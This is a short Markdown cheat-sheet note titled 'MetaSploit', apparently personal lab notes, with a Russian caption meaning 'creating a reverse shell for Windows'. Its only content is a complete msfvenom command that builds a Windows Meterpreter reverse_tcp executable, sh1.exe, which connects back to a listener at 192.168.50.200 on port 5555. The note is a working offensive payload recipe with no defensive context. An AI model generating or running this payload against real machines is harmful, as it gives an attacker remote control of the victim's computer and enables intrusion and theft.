# MetaSploit

Создаем реверс шелл для виндовс
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe
